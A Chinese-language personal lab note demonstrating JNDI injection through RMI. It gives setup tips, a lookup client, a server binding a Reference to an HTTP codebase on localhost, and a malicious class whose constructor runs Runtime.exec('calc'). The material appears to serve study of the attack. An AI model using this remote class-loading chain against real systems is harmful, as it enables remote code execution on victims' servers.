1. jndi服务端的绑定地址为Reference refobj=new Reference("TestObj","TestObj","http://localhost:7777/")，注意后面是有斜杠的，TestObj为实际恶意类的名称
2. 恶意类自身不应该在任何package中，同时恶意类是不是主类，恶意代码可以写在它的构造函数中，这样在恶意类初始化的时候就会执行恶意代码；如果恶意类在某个package中，比如寻找该恶意类TestObj时，通过加载恶意代码发现它在某个包下，就会报找不到类的错误，相当于packge.TestObj和TestObj不是同一个类
3. 恶意类写好了之后可以用javac编译，然后通过python开启http服务，放在相应文件夹下让JNDI客户端去加载，但要注意，python启动http服务的文件夹不能在项目的classpath下面，不然会导致本地查询成功，直接在本地加载恶意类，如果成功远程加载的话，http服务器上会显示get请求的记录

![1688306732483](C:\Users\Jack\Desktop\code\cybersec\memtrojan\1688306732483.png)

代码为：

```java
package JNDI;


import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.rmi.RemoteException;
import java.util.Hashtable;

public class JNDIClient {
    public static void main(String[] args) {
        try {
            // 创建属性 Hashtable
            Hashtable<String, String> env = new Hashtable<>();
            env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
            env.put(Context.PROVIDER_URL, "rmi://localhost:1099");


            // 创建 JNDI 上下文
            Context context = new InitialContext(env);

            // 查找远程对象
//            IHello hello = (IHello) context.lookup("rmi://localhost:1099/remoteobj");

            context.lookup("rmi://localhost:1099/remoteobj");

            // 调用远程方法
//            String result = hello.sayHello("John");
//
//            System.out.println("Result: " + result);
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }
}
```

```java
package JNDI;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.io.IOException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Hashtable;

public class JNDIserver {
    public static void main(String[] args) throws NamingException, IOException {

//        Hashtable<String, String> env = new Hashtable<>();
//        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
//        env.put(Context.PROVIDER_URL, "rmi://192.168.0.103:1099");




        Registry registry = LocateRegistry.createRegistry(1099);
        InitialContext initialContext=new InitialContext();

//        initialContext.bind("rmi://192.168.0.103:1099/remoteobj",new HelloImpl());

        Reference refobj=new Reference("TestObj","TestObj","http://localhost:7777/");
        initialContext.bind("rmi://localhost:1099/remoteobj",refobj);

    }
}
```

```java
import java.io.IOException;

public class TestObj {

    public TestObj() throws IOException {
        Runtime.getRuntime().exec("calc");
    }

}
```

